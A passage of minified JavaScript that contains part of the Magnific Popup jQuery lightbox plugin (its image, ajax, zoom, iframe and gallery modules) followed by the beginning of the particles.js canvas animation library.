            _hasScrollBar: function(t) {
                return (e.isIE7 ? s.height() : document.body.scrollHeight) > (t || b.height())
            },
            _setFocus: function() {
                (e.st.focus ? e.content.find(e.st.focus).eq(0) : e.wrap).focus()
            },
            _onFocusIn: function(i) {
                return i.target === e.wrap[0] || t.contains(e.wrap[0], i.target) ? void 0 : (e._setFocus(), !1)
            },
            _parseMarkup: function(e, i, s) {
                var n;
                s.data && (i = t.extend(s.data, i)), S(c, [e, i, s]), t.each(i, (function(i, s) {
                    if (void 0 === s || !1 === s) return !0;
                    if ((n = i.split("_")).length > 1) {
                        var o = e.find(p + "-" + n[0]);
                        if (o.length > 0) {
                            var r = n[1];
                            "replaceWith" === r ? o[0] !== s[0] && o.replaceWith(s) : "img" === r ? o.is("img") ? o.attr("src", s) : o.replaceWith(t("<img>").attr("src", s).attr("class", o.attr("class"))) : o.attr(n[1], s)
                        }
                    } else e.find(p + "-" + i).html(s)
                }))
            },
            _getScrollbarSize: function() {
                if (void 0 === e.scrollbarSize) {
                    var t = document.createElement("div");
                    t.style.cssText = "width: 99px; height: 99px; overflow: scroll; position: absolute; top: -9999px;", document.body.appendChild(t), e.scrollbarSize = t.offsetWidth - t.clientWidth, document.body.removeChild(t)
                }
                return e.scrollbarSize
            }
        }, t.magnificPopup = {
            instance: null,
            proto: g.prototype,
            modules: [],
            open: function(e, i) {
                return T(), (e = e ? t.extend(!0, {}, e) : {}).isObj = !0, e.index = i || 0, this.instance.open(e)
            },
            close: function() {
                return t.magnificPopup.instance && t.magnificPopup.instance.close()
            },
            registerModule: function(e, i) {
                i.options && (t.magnificPopup.defaults[e] = i.options), t.extend(this.proto, i.proto), this.modules.push(e)
            },
            defaults: {
                disableOn: 0,
                key: null,
                midClick: !1,
                mainClass: "",
                preloader: !0,
                focus: "",
                closeOnContentClick: !1,
                closeOnBgClick: !0,
                closeBtnInside: !0,
                showCloseBtn: !0,
                enableEscapeKey: !0,
                modal: !1,
                alignTop: !1,
                removalDelay: 0,
                prependTo: null,
                fixedContentPos: "auto",
                fixedBgPos: "auto",
                overflowY: "auto",
                closeMarkup: '<button title="%title%" type="button" class="mfp-close">&#215;</button>',
                tClose: "Close (Esc)",
                tLoading: "Loading...",
                autoFocusLast: !0
            }
        }, t.fn.magnificPopup = function(i) {
            T();
            var s = t(this);
            if ("string" == typeof i)
                if ("open" === i) {
                    var n, o = y ? s.data("magnificPopup") : s[0].magnificPopup,
                        r = parseInt(arguments[1], 10) || 0;
                    o.items ? n = o.items[r] : (n = s, o.delegate && (n = n.find(o.delegate)), n = n.eq(r)), e._openClick({
                        mfpEl: n
                    }, s, o)
                } else e.isOpen && e[i].apply(e, Array.prototype.slice.call(arguments, 1));
            else i = t.extend(!0, {}, i), y ? s.data("magnificPopup", i) : s[0].magnificPopup = i, e.addGroup(s, i);
            return s
        };
        var C, _, E, P = "inline",
            A = function() {
                E && (_.after(E.addClass(C)).detach(), E = null)
            };
        t.magnificPopup.registerModule(P, {
            options: {
                hiddenClass: "hide",
                markup: "",
                tNotFound: "Content not found"
            },
            proto: {
                initInline: function() {
                    e.types.push(P), w(a + "." + P, (function() {
                        A()
                    }))
                },
                getInline: function(i, s) {
                    if (A(), i.src) {
                        var n = e.st.inline,
                            o = t(i.src);
                        if (o.length) {
                            var r = o[0].parentNode;
                            r && r.tagName && (_ || (C = n.hiddenClass, _ = x(C), C = "mfp-" + C), E = o.after(_).detach().removeClass(C)), e.updateStatus("ready")
                        } else e.updateStatus("error", n.tNotFound), o = t("<div>");
                        return i.inlineElement = o, o
                    }
                    return e.updateStatus("ready"), e._parseMarkup(s, {}, i), s
                }
            }
        });
        var M, $ = "ajax",
            I = function() {
                M && t(document.body).removeClass(M)
            },
            z = function() {
                I(), e.req && e.req.abort()
            };
        t.magnificPopup.registerModule($, {
            options: {
                settings: null,
                cursor: "mfp-ajax-cur",
                tError: '<a href="%url%">The content</a> could not be loaded.'
            },
            proto: {
                initAjax: function() {
                    e.types.push($), M = e.st.ajax.cursor, w(a + "." + $, z), w("BeforeChange." + $, z)
                },
                getAjax: function(i) {
                    M && t(document.body).addClass(M), e.updateStatus("loading");
                    var s = t.extend({
                        url: i.src,
                        success: function(s, n, o) {
                            var r = {
                                data: s,
                                xhr: o
                            };
                            S("ParseAjax", r), e.appendContent(t(r.data), $), i.finished = !0, I(), e._setFocus(), setTimeout((function() {
                                e.wrap.addClass(f)
                            }), 16), e.updateStatus("ready"), S("AjaxContentAdded")
                        },
                        error: function() {
                            I(), i.finished = i.loadError = !0, e.updateStatus("error", e.st.ajax.tError.replace("%url%", i.src))
                        }
                    }, e.st.ajax.settings);
                    return e.req = t.ajax(s), ""
                }
            }
        });
        var L, O = function(i) {
            if (i.data && void 0 !== i.data.title) return i.data.title;
            var s = e.st.image.titleSrc;
            if (s) {
                if (t.isFunction(s)) return s.call(e, i);
                if (i.el) return i.el.attr(s) || ""
            }
            return ""
        };
        t.magnificPopup.registerModule("image", {
            options: {
                markup: '<div class="mfp-figure"><div class="mfp-close"></div><figure><div class="mfp-img"></div><figcaption><div class="mfp-bottom-bar"><div class="mfp-title"></div><div class="mfp-counter"></div></div></figcaption></figure></div>',
                cursor: "mfp-zoom-out-cur",
                titleSrc: "title",
                verticalFit: !0,
                tError: '<a href="%url%">The image</a> could not be loaded.'
            },
            proto: {
                initImage: function() {
                    var i = e.st.image,
                        s = ".image";
                    e.types.push("image"), w(d + s, (function() {
                        "image" === e.currItem.type && i.cursor && t(document.body).addClass(i.cursor)
                    })), w(a + s, (function() {
                        i.cursor && t(document.body).removeClass(i.cursor), b.off("resize" + p)
                    })), w("Resize" + s, e.resizeImage), e.isLowIE && w("AfterChange", e.resizeImage)
                },
                resizeImage: function() {
                    var t = e.currItem;
                    if (t && t.img && e.st.image.verticalFit) {
                        var i = 0;
                        e.isLowIE && (i = parseInt(t.img.css("padding-top"), 10) + parseInt(t.img.css("padding-bottom"), 10)), t.img.css("max-height", e.wH - i)
                    }
                },
                _onImageHasSize: function(t) {
                    t.img && (t.hasSize = !0, L && clearInterval(L), t.isCheckingImgSize = !1, S("ImageHasSize", t), t.imgHidden && (e.content && e.content.removeClass("mfp-loading"), t.imgHidden = !1))
                },
                findImageSize: function(t) {
                    var i = 0,
                        s = t.img[0],
                        n = function(o) {
                            L && clearInterval(L), L = setInterval((function() {
                                return s.naturalWidth > 0 ? void e._onImageHasSize(t) : (i > 200 && clearInterval(L), void(3 === ++i ? n(10) : 40 === i ? n(50) : 100 === i && n(500)))
                            }), o)
                        };
                    n(1)
                },
                getImage: function(i, s) {
                    var n = 0,
                        o = function() {
                            i && (i.img[0].complete ? (i.img.off(".mfploader"), i === e.currItem && (e._onImageHasSize(i), e.updateStatus("ready")), i.hasSize = !0, i.loaded = !0, S("ImageLoadComplete")) : 200 > ++n ? setTimeout(o, 100) : r())
                        },
                        r = function() {
                            i && (i.img.off(".mfploader"), i === e.currItem && (e._onImageHasSize(i), e.updateStatus("error", a.tError.replace("%url%", i.src))), i.hasSize = !0, i.loaded = !0, i.loadError = !0)
                        },
                        a = e.st.image,
                        l = s.find(".mfp-img");
                    if (l.length) {
                        var c = document.createElement("img");
                        c.className = "mfp-img", i.el && i.el.find("img").length && (c.alt = i.el.find("img").attr("alt")), i.img = t(c).on("load.mfploader", o).on("error.mfploader", r), c.src = i.src, l.is("img") && (i.img = i.img.clone()), (c = i.img[0]).naturalWidth > 0 ? i.hasSize = !0 : c.width || (i.hasSize = !1)
                    }
                    return e._parseMarkup(s, {
                        title: O(i),
                        img_replaceWith: i.img
                    }, i), e.resizeImage(), i.hasSize ? (L && clearInterval(L), i.loadError ? (s.addClass("mfp-loading"), e.updateStatus("error", a.tError.replace("%url%", i.src))) : (s.removeClass("mfp-loading"), e.updateStatus("ready")), s) : (e.updateStatus("loading"), i.loading = !0, i.hasSize || (i.imgHidden = !0, s.addClass("mfp-loading"), e.findImageSize(i)), s)
                }
            }
        });
        var j;
        t.magnificPopup.registerModule("zoom", {
            options: {
                enabled: !1,
                easing: "ease-in-out",
                duration: 300,
                opener: function(t) {
                    return t.is("img") ? t : t.find("img")
                }
            },
            proto: {
                initZoom: function() {
                    var t, i = e.st.zoom,
                        s = ".zoom";
                    if (i.enabled && e.supportsTransition) {
                        var n, o, r = i.duration,
                            c = function(t) {
                                var e = t.clone().removeAttr("style").removeAttr("class").addClass("mfp-animated-image"),
                                    s = "all " + i.duration / 1e3 + "s " + i.easing,
                                    n = {
                                        position: "fixed",
                                        zIndex: 9999,
                                        left: 0,
                                        top: 0,
                                        "-webkit-backface-visibility": "hidden"
                                    },
                                    o = "transition";
                                return n["-webkit-" + o] = n["-moz-" + o] = n["-o-" + o] = n[o] = s, e.css(n), e
                            },
                            d = function() {
                                e.content.css("visibility", "visible")
                            };
                        w("BuildControls" + s, (function() {
                            if (e._allowZoom()) {
                                if (clearTimeout(n), e.content.css("visibility", "hidden"), !(t = e._getItemToZoom())) return void d();
                                (o = c(t)).css(e._getOffset()), e.wrap.append(o), n = setTimeout((function() {
                                    o.css(e._getOffset(!0)), n = setTimeout((function() {
                                        d(), setTimeout((function() {
                                            o.remove(), t = o = null, S("ZoomAnimationEnded")
                                        }), 16)
                                    }), r)
                                }), 16)
                            }
                        })), w(l + s, (function() {
                            if (e._allowZoom()) {
                                if (clearTimeout(n), e.st.removalDelay = r, !t) {
                                    if (!(t = e._getItemToZoom())) return;
                                    o = c(t)
                                }
                                o.css(e._getOffset(!0)), e.wrap.append(o), e.content.css("visibility", "hidden"), setTimeout((function() {
                                    o.css(e._getOffset())
                                }), 16)
                            }
                        })), w(a + s, (function() {
                            e._allowZoom() && (d(), o && o.remove(), t = null)
                        }))
                    }
                },
                _allowZoom: function() {
                    return "image" === e.currItem.type
                },
                _getItemToZoom: function() {
                    return !!e.currItem.hasSize && e.currItem.img
                },
                _getOffset: function(i) {
                    var s, n = (s = i ? e.currItem.img : e.st.zoom.opener(e.currItem.el || e.currItem)).offset(),
                        o = parseInt(s.css("padding-top"), 10),
                        r = parseInt(s.css("padding-bottom"), 10);
                    n.top -= t(window).scrollTop() - o;
                    var a = {
                        width: s.width(),
                        height: (y ? s.innerHeight() : s[0].offsetHeight) - r - o
                    };
                    return void 0 === j && (j = void 0 !== document.createElement("p").style.MozTransform), j ? a["-moz-transform"] = a.transform = "translate(" + n.left + "px," + n.top + "px)" : (a.left = n.left, a.top = n.top), a
                }
            }
        });
        var H = "iframe",
            D = function(t) {
                if (e.currTemplate[H]) {
                    var i = e.currTemplate[H].find("iframe");
                    i.length && (t || (i[0].src = "//about:blank"), e.isIE8 && i.css("display", t ? "block" : "none"))
                }
            };
        t.magnificPopup.registerModule(H, {
            options: {
                markup: '<div class="mfp-iframe-scaler"><div class="mfp-close"></div><iframe class="mfp-iframe" src="//about:blank" frameborder="0" allowfullscreen></iframe></div>',
                srcAction: "iframe_src",
                patterns: {
                    youtube: {
                        index: "youtube.com",
                        id: "v=",
                        src: "//www.youtube.com/embed/%id%?autoplay=1"
                    },
                    vimeo: {
                        index: "vimeo.com/",
                        id: "/",
                        src: "//player.vimeo.com/video/%id%?autoplay=1"
                    },
                    gmaps: {
                        index: "//maps.google.",
                        src: "%id%&output=embed"
                    }
                }
            },
            proto: {
                initIframe: function() {
                    e.types.push(H), w("BeforeChange", (function(t, e, i) {
                        e !== i && (e === H ? D() : i === H && D(!0))
                    })), w(a + "." + H, (function() {
                        D()
                    }))
                },
                getIframe: function(i, s) {
                    var n = i.src,
                        o = e.st.iframe;
                    t.each(o.patterns, (function() {
                        return n.indexOf(this.index) > -1 ? (this.id && (n = "string" == typeof this.id ? n.substr(n.lastIndexOf(this.id) + this.id.length, n.length) : this.id.call(this, n)), n = this.src.replace("%id%", n), !1) : void 0
                    }));
                    var r = {};
                    return o.srcAction && (r[o.srcAction] = n), e._parseMarkup(s, r, i), e.updateStatus("ready"), s
                }
            }
        });
        var F = function(t) {
                var i = e.items.length;
                return t > i - 1 ? t - i : 0 > t ? i + t : t
            },
            R = function(t, e, i) {
                return t.replace(/%curr%/gi, e + 1).replace(/%total%/gi, i)
            };
        t.magnificPopup.registerModule("gallery", {
            options: {
                enabled: !1,
                arrowMarkup: '<button title="%title%" type="button" class="mfp-arrow mfp-arrow-%dir%"></button>',
                preload: [0, 2],
                navigateByImgClick: !0,
                arrows: !0,
                tPrev: "Previous (Left arrow key)",
                tNext: "Next (Right arrow key)",
                tCounter: "%curr% of %total%"
            },
            proto: {
                initGallery: function() {
                    var i = e.st.gallery,
                        n = ".mfp-gallery";
                    return e.direction = !0, !(!i || !i.enabled) && (o += " mfp-gallery", w(d + n, (function() {
                        i.navigateByImgClick && e.wrap.on("click" + n, ".mfp-img", (function() {
                            return e.items.length > 1 ? (e.next(), !1) : void 0
                        })), s.on("keydown" + n, (function(t) {
                            37 === t.keyCode ? e.prev() : 39 === t.keyCode && e.next()
                        }))
                    })), w("UpdateStatus" + n, (function(t, i) {
                        i.text && (i.text = R(i.text, e.currItem.index, e.items.length))
                    })), w(c + n, (function(t, s, n, o) {
                        var r = e.items.length;
                        n.counter = r > 1 ? R(i.tCounter, o.index, r) : ""
                    })), w("BuildControls" + n, (function() {
                        if (e.items.length > 1 && i.arrows && !e.arrowLeft) {
                            var s = i.arrowMarkup,
                                n = e.arrowLeft = t(s.replace(/%title%/gi, i.tPrev).replace(/%dir%/gi, "left")).addClass(v),
                                o = e.arrowRight = t(s.replace(/%title%/gi, i.tNext).replace(/%dir%/gi, "right")).addClass(v);
                            n.click((function() {
                                e.prev()
                            })), o.click((function() {
                                e.next()
                            })), e.container.append(n.add(o))
                        }
                    })), w(h + n, (function() {
                        e._preloadTimeout && clearTimeout(e._preloadTimeout), e._preloadTimeout = setTimeout((function() {
                            e.preloadNearbyImages(), e._preloadTimeout = null
                        }), 16)
                    })), void w(a + n, (function() {
                        s.off(n), e.wrap.off("click" + n), e.arrowRight = e.arrowLeft = null
                    })))
                },
                next: function() {
                    e.direction = !0, e.index = F(e.index + 1), e.updateItemHTML()
                },
                prev: function() {
                    e.direction = !1, e.index = F(e.index - 1), e.updateItemHTML()
                },
                goTo: function(t) {
                    e.direction = t >= e.index, e.index = t, e.updateItemHTML()
                },
                preloadNearbyImages: function() {
                    var t, i = e.st.gallery.preload,
                        s = Math.min(i[0], e.items.length),
                        n = Math.min(i[1], e.items.length);
                    for (t = 1; t <= (e.direction ? n : s); t++) e._preloadItem(e.index + t);
                    for (t = 1; t <= (e.direction ? s : n); t++) e._preloadItem(e.index - t)
                },
                _preloadItem: function(i) {
                    if (i = F(i), !e.items[i].preloaded) {
                        var s = e.items[i];
                        s.parsed || (s = e.parseEl(i)), S("LazyLoad", s), "image" === s.type && (s.img = t('<img class="mfp-img" />').on("load.mfploader", (function() {
                            s.hasSize = !0
                        })).on("error.mfploader", (function() {
                            s.hasSize = !0, s.loadError = !0, S("LazyLoadError", s)
                        })).attr("src", s.src)), s.preloaded = !0
                    }
                }
            }
        });
        var X = "retina";
        t.magnificPopup.registerModule(X, {
            options: {
                replaceSrc: function(t) {
                    return t.src.replace(/\.\w+$/, (function(t) {
                        return "@2x" + t
                    }))
                },
                ratio: 1
            },
            proto: {
                initRetina: function() {
                    if (window.devicePixelRatio > 1) {
                        var t = e.st.retina,
                            i = t.ratio;
                        (i = isNaN(i) ? i() : i) > 1 && (w("ImageHasSize." + X, (function(t, e) {
                            e.img.css({
                                "max-width": e.img[0].naturalWidth / i,
                                width: "100%"
                            })
                        })), w("ElementParse." + X, (function(e, s) {
                            s.src = t.replaceSrc(s, i)
                        })))
                    }
                }
            }
        }), T()
    }));
var pJS = function(t, e) {
    var i = document.querySelector("#" + t + " > .particles-js-canvas-el");
    this.pJS = {
        canvas: {
            el: i,
            w: i.offsetWidth,
            h: i.offsetHeight
        },
        particles: {
            number: {
                value: 400,
                density: {
                    enable: !0,
                    value_area: 800
                }
            },
            color: {
                value: "#fff"
            },
            shape: {
                type: "circle",
                stroke: {
                    width: 0,
                    color: "#ff0000"
                },
                polygon: {
                    nb_sides: 5
                },
                image: {
                    src: "",
                    width: 100,
                    height: 100
                }
            },
            opacity: {
                value: 1,
                random: !1,
                anim: {
                    enable: !1,
                    speed: 2,
                    opacity_min: 0,
                    sync: !1
                }
            },
            size: {
                value: 20,
                random: !1,
                anim: {
                    enable: !1,
                    speed: 20,
                    size_min: 0,
                    sync: !1
                }
            },
            line_linked: {
                enable: !0,
                distance: 100,
                color: "#fff",
                opacity: 1,
                width: 1
            },
            move: {
                enable: !0,
                speed: 2,
                direction: "none",
                random: !1,
                straight: !1,
                out_mode: "out",
                bounce: !1,
                attract: {
                    enable: !1,
                    rotateX: 3e3,
                    rotateY: 3e3
                }
            },
            array: []
        },
        interactivity: {
            detect_on: "canvas",
            events: {
                onhover: {
                    enable: !0,
                    mode: "grab"
                },
                onclick: {
                    enable: !0,
                    mode: "push"
                },
                resize: !0
            },
            modes: {
                grab: {
                    distance: 100,
                    line_linked: {
                        opacity: 1
                    }
                },
                bubble: {
                    distance: 200,
                    size: 80,
                    duration: .4
                },
                repulse: {
                    distance: 200,
                    duration: .4
                },
                push: {
                    particles_nb: 4
                },
                remove: {
                    particles_nb: 2
                }
            },
            mouse: {}
        },
        retina_detect: !1,
        fn: {
            interact: {},
            modes: {},
            vendors: {}
        },
        tmp: {}
    };
    var s = this.pJS;
    e && Object.deepExtend(s, e), s.tmp.obj = {
        size_value: s.particles.size.value,
        size_anim_speed: s.particles.size.anim.speed,
        move_speed: s.particles.move.speed,
        line_linked_distance: s.particles.line_linked.distance,
        line_linked_width: s.particles.line_linked.width,
        mode_grab_distance: s.interactivity.modes.grab.distance,
        mode_bubble_distance: s.interactivity.modes.bubble.distance,
        mode_bubble_size: s.interactivity.modes.bubble.size,
        mode_repulse_distance: s.interactivity.modes.repulse.distance
    }, s.fn.retinaInit = function() {
        s.retina_detect && window.devicePixelRatio > 1 ? (s.canvas.pxratio = window.devicePixelRatio, s.tmp.retina = !0) : (s.canvas.pxratio = 1, s.tmp.retina = !1), s.canvas.w = s.canvas.el.offsetWidth * s.canvas.pxratio, s.canvas.h = s.canvas.el.offsetHeight * s.canvas.pxratio, s.particles.size.value = s.tmp.obj.size_value * s.canvas.pxratio, s.particles.size.anim.speed = s.tmp.obj.size_anim_speed * s.canvas.pxratio, s.particles.move.speed = s.tmp.obj.move_speed * s.canvas.pxratio, s.particles.line_linked.distance = s.tmp.obj.line_linked_distance * s.canvas.pxratio, s.interactivity.modes.grab.distance = s.tmp.obj.mode_grab_distance * s.canvas.pxratio, s.interactivity.modes.bubble.distance = s.tmp.obj.mode_bubble_distance * s.canvas.pxratio, s.particles.line_linked.width = s.tmp.obj.line_linked_width * s.canvas.pxratio, s.interactivity.modes.bubble.size = s.tmp.obj.mode_bubble_size * s.canvas.pxratio, s.interactivity.modes.repulse.distance = s.tmp.obj.mode_repulse_distance * s.canvas.pxratio
    }, s.fn.canvasInit = function() {
        s.canvas.ctx = s.canvas.el.getContext("2d")
    }, s.fn.canvasSize = function() {
        s.canvas.el.width = s.canvas.w, s.canvas.el.height = s.canvas.h, s && s.interactivity.events.resize && window.addEventListener("resize", (function() {
            s.canvas.w = s.canvas.el.offsetWidth, s.canvas.h = s.canvas.el.offsetHeight, s.tmp.retina && (s.canvas.w *= s.canvas.pxratio, s.canvas.h *= s.canvas.pxratio), s.canvas.el.width = s.canvas.w, s.canvas.el.height = s.canvas.h, s.particles.move.enable || (s.fn.particlesEmpty(), s.fn.particlesCreate(), s.fn.particlesDraw(), s.fn.vendors.densityAutoParticles()), s.fn.vendors.densityAutoParticles()
        }))
    }, s.fn.canvasPaint = function() {
        s.canvas.ctx.fillRect(0, 0, s.canvas.w, s.canvas.h)
    }, s.fn.canvasClear = function() {
        s.canvas.ctx.clearRect(0, 0, s.canvas.w, s.canvas.h)
    }, s.fn.particle = function(t, e, i) {
        if (this.radius = (s.particles.size.random ? Math.random() : 1) * s.particles.size.value, s.particles.size.anim.enable && (this.size_status = !1, this.vs = s.particles.size.anim.speed / 100, s.particles.size.anim.sync || (this.vs = this.vs * Math.random())), this.x = i ? i.x : Math.random() * s.canvas.w, this.y = i ? i.y : Math.random() * s.canvas.h, this.x > s.canvas.w - 2 * this.radius ? this.x = this.x - this.radius : this.x < 2 * this.radius && (this.x = this.x + this.radius), this.y > s.canvas.h - 2 * this.radius ? this.y = this.y - this.radius : this.y < 2 * this.radius && (this.y = this.y + this.radius), s.particles.move.bounce && s.fn.vendors.checkOverlap(this, i), this.color = {}, "object" == typeof t.value)
            if (t.value instanceof Array) {
                var n = t.value[Math.floor(Math.random() * s.particles.color.value.length)];
                this.color.rgb = hexToRgb(n)
            } else null != t.value.r && null != t.value.g && null != t.value.b && (this.color.rgb = {
                r: t.value.r,
                g: t.value.g,
                b: t.value.b
            }), null != t.value.h && null != t.value.s && null != t.value.l && (this.color.hsl = {
                h: t.value.h,
                s: t.value.s,
                l: t.value.l
            });
        else "random" == t.value ? this.color.rgb = {
            r: Math.floor(256 * Math.random()) + 0,
            g: Math.floor(256 * Math.random()) + 0,
            b: Math.floor(256 * Math.random()) + 0
        } : "string" == typeof t.value && (this.color = t, this.color.rgb = hexToRgb(this.color.value));
        this.opacity = (s.particles.opacity.random ? Math.random() : 1) * s.particles.opacity.value, s.particles.opacity.anim.enable && (this.opacity_status = !1, this.vo = s.particles.opacity.anim.speed / 100, s.particles.opacity.anim.sync || (this.vo = this.vo * Math.random()));
        var o = {};
        switch (s.particles.move.direction) {
            case "top":
                o = {
                    x: 0,
                    y: -1
                };
                break;
            case "top-right":
                o = {
                    x: .5,
                    y: -.5
                };
                break;
            case "right":
                o = {
                    x: 1,
                    y: -0
                };
                break;
            case "bottom-right":
                o = {
                    x: .5,
                    y: .5
                };
                break;
            case "bottom":
                o = {
                    x: 0,
                    y: 1
                };
                break;
            case "bottom-left":
                o = {
                    x: -.5,
                    y: 1
                };
                break;
            case "left":
                o = {
                    x: -1,
                    y: 0
                };
                break;
            case "top-left":
                o = {
                    x: -.5,
                    y: -.5
                };
                break;
            default:
                o = {
                    x: 0,
                    y: 0
                }
        }
        s.particles.move.straight ? (this.vx = o.x, this.vy = o.y, s.particles.move.random && (this.vx = this.vx * Math.random(), this.vy = this.vy * Math.random())) : (this.vx = o.x + Math.random() - .5, this.vy = o.y + Math.random() - .5), this.vx_i = this.vx, this.vy_i = this.vy;
        var r = s.particles.shape.type;
        if ("object" == typeof r) {
            if (r instanceof Array) {
                var a = r[Math.floor(Math.random() * r.length)];
                this.shape = a
            }
        } else this.shape = r;
        if ("image" == this.shape) {
            var l = s.particles.shape;
            this.img = {
                src: l.image.src,
                ratio: l.image.width / l.image.height
            }, this.img.ratio || (this.img.ratio = 1), "svg" == s.tmp.img_type && null != s.tmp.source_svg && (s.fn.vendors.createSvgImg(this), s.tmp.pushing && (this.img.loaded = !1))
        }
    }, s.fn.particle.prototype.draw = function() {
        var t = this;
        if (null != t.radius_bubble) var e = t.radius_bubble;
        else e = t.radius;
        if (null != t.opacity_bubble) var i = t.opacity_bubble;
        else i = t.opacity;
        if (t.color.rgb) var n = "rgba(" + t.color.rgb.r + "," + t.color.rgb.g + "," + t.color.rgb.b + "," + i + ")";
        else n = "hsla(" + t.color.hsl.h + "," + t.color.hsl.s + "%," + t.color.hsl.l + "%," + i + ")";
        switch (s.canvas.ctx.fillStyle = n, s.canvas.ctx.beginPath(), t.shape) {
            case "circle":
                s.canvas.ctx.arc(t.x, t.y, e, 0, 2 * Math.PI, !1);
                break;
            case "edge":
                s.canvas.ctx.rect(t.x - e, t.y - e, 2 * e, 2 * e);
                break;
            case "triangle":
                s.fn.vendors.drawShape(s.canvas.ctx, t.x - e, t.y + e / 1.66, 2 * e, 3, 2);
                break;
            case "polygon":
                s.fn.vendors.drawShape(s.canvas.ctx, t.x - e / (s.particles.shape.polygon.nb_sides / 3.5), t.y - e / .76, 2.66 * e / (s.particles.shape.polygon.nb_sides / 3), s.particles.shape.polygon.nb_sides, 1);
                break;
            case "star":
                s.fn.vendors.drawShape(s.canvas.ctx, t.x - 2 * e / (s.particles.shape.polygon.nb_sides / 4), t.y - e / 1.52, 2 * e * 2.66 / (s.particles.shape.polygon.nb_sides / 3), s.particles.shape.polygon.nb_sides, 2);
                break;
            case "image":
                if ("svg" == s.tmp.img_type) var o = t.img.obj;
                else o = s.tmp.img_obj;
                o && s.canvas.ctx.drawImage(o, t.x - e, t.y - e, 2 * e, 2 * e / t.img.ratio)
        }
        s.canvas.ctx.closePath(), s.particles.shape.stroke.width > 0 && (s.canvas.ctx.strokeStyle = s.particles.shape.stroke.color, s.canvas.ctx.lineWidth = s.particles.shape.stroke.width, s.canvas.ctx.stroke()), s.canvas.ctx.fill()
    }, s.fn.particlesCreate = function() {
        for (var t = 0; t < s.particles.number.value; t++) s.particles.array.push(new s.fn.particle(s.particles.color, s.particles.opacity.value))
    }, s.fn.particlesUpdate = function() {
        for (var t = 0; t < s.particles.array.length; t++) {
            var e = s.particles.array[t];
            if (s.particles.move.enable) {
                var i = s.particles.move.speed / 2;
                e.x += e.vx * i, e.y += e.vy * i
            }
            if (s.particles.opacity.anim.enable && (1 == e.opacity_status ? (e.opacity >= s.particles.opacity.value && (e.opacity_status = !1), e.opacity += e.vo) : (e.opacity <= s.particles.opacity.anim.opacity_min && (e.opacity_status = !0), e.opacity -= e.vo), e.opacity < 0 && (e.opacity = 0)), s.particles.size.anim.enable && (1 == e.size_status ? (e.radius >= s.particles.size.value && (e.size_status = !1), e.radius += e.vs) : (e.radius <= s.particles.size.anim.size_min && (e.size_status = !0), e.radius -= e.vs), e.radius < 0 && (e.radius = 0)), "bounce" == s.particles.move.out_mode) var n = {
                x_left: e.radius,
                x_right: s.canvas.w,
                y_top: e.radius,
                y_bottom: s.canvas.h
            };
            else n = {
                x_left: -e.radius,
                x_right: s.canvas.w + e.radius,
                y_top: -e.radius,
                y_bottom: s.canvas.h + e.radius
            };
            switch (e.x - e.radius > s.canvas.w ? (e.x = n.x_left, e.y = Math.random() * s.canvas.h) : e.x + e.radius < 0 && (e.x = n.x_right, e.y = Math.random() * s.canvas.h), e.y - e.radius > s.canvas.h ? (e.y = n.y_top, e.x = Math.random() * s.canvas.w) : e.y + e.radius < 0 && (e.y = n.y_bottom, e.x = Math.random() * s.canvas.w), s.particles.move.out_mode) {
                case "bounce":
                    (e.x + e.radius > s.canvas.w || e.x - e.radius < 0) && (e.vx = -e.vx), (e.y + e.radius > s.canvas.h || e.y - e.radius < 0) && (e.vy = -e.vy)
            }
            if (isInArray("grab", s.interactivity.events.onhover.mode) && s.fn.modes.grabParticle(e), (isInArray("bubble", s.interactivity.events.onhover.mode) || isInArray("bubble", s.interactivity.events.onclick.mode)) && s.fn.modes.bubbleParticle(e), (isInArray("repulse", s.interactivity.events.onhover.mode) || isInArray("repulse", s.interactivity.events.onclick.mode)) && s.fn.modes.repulseParticle(e), s.particles.line_linked.enable || s.particles.move.attract.enable)
                for (var o = t + 1; o < s.particles.array.length; o++) {
                    var r = s.particles.array[o];
                    s.particles.line_linked.enable && s.fn.interact.linkParticles(e, r), s.particles.move.attract.enable && s.fn.interact.attractParticles(e, r), s.particles.move.bounce && s.fn.interact.bounceParticles(e, r)
                }
        }
    }, s.fn.particlesDraw = function() {
        s.canvas.ctx.clearRect(0, 0, s.canvas.w, s.canvas.h), s.fn.particlesUpdate();
        for (var t = 0; t < s.particles.array.length; t++) {
            s.particles.array[t].draw()
        }
    }, s.fn.particlesEmpty = function() {
        s.particles.array = []
    }, s.fn.particlesRefresh = function() {
        cancelRequestAnimFrame(s.fn.checkAnimFrame), cancelRequestAnimFrame(s.fn.drawAnimFrame), s.tmp.source_svg = void 0, s.tmp.img_obj = void 0, s.tmp.count_svg = 0, s.fn.particlesEmpty(), s.fn.canvasClear(), s.fn.vendors.start()
    }, s.fn.interact.linkParticles = function(t, e) {
        var i = t.x - e.x,
            n = t.y - e.y,
            o = Math.sqrt(i * i + n * n);
        if (o <= s.particles.line_linked.distance) {
            var r = s.particles.line_linked.opacity - o / (1 / s.particles.line_linked.opacity) / s.particles.line_linked.distance;
            if (r > 0) {
                var a = s.particles.line_linked.color_rgb_line;
                s.canvas.ctx.strokeStyle = "rgba(" + a.r + "," + a.g + "," + a.b + "," + r + ")", s.canvas.ctx.lineWidth = s.particles.line_linked.width, s.canvas.ctx.beginPath(), s.canvas.ctx.moveTo(t.x, t.y), s.canvas.ctx.lineTo(e.x, e.y), s.canvas.ctx.stroke(), s.canvas.ctx.closePath()
            }
        }
    }, s.fn.interact.attractParticles = function(t, e) {
        var i = t.x - e.x,
            n = t.y - e.y;
        if (Math.sqrt(i * i + n * n) <= s.particles.line_linked.distance) {
            var o = i / (1e3 * s.particles.move.attract.rotateX),
                r = n / (1e3 * s.particles.move.attract.rotateY);
            t.vx -= o, t.vy -= r, e.vx += o, e.vy += r
        }
    }, s.fn.interact.bounceParticles = function(t, e) {
        var i = t.x - e.x,
            s = t.y - e.y,
            n = Math.sqrt(i * i + s * s);
        t.radius + e.radius >= n && (t.vx = -t.vx, t.vy = -t.vy, e.vx = -e.vx, e.vy = -e.vy)
    }, s.fn.modes.pushParticles = function(t, e) {
        s.tmp.pushing = !0;
        for (var i = 0; t > i; i++) s.particles.array.push(new s.fn.particle(s.particles.color, s.particles.opacity.value, {
            x: e ? e.pos_x : Math.random() * s.canvas.w,
            y: e ? e.pos_y : Math.random() * s.canvas.h
        })), i == t - 1 && (s.particles.move.enable || s.fn.particlesDraw(), s.tmp.pushing = !1)
    }, s.fn.modes.removeParticles = function(t) {
        s.particles.array.splice(0, t), s.particles.move.enable || s.fn.particlesDraw()
    }, s.fn.modes.bubbleParticle = function(t) {
        function e() {
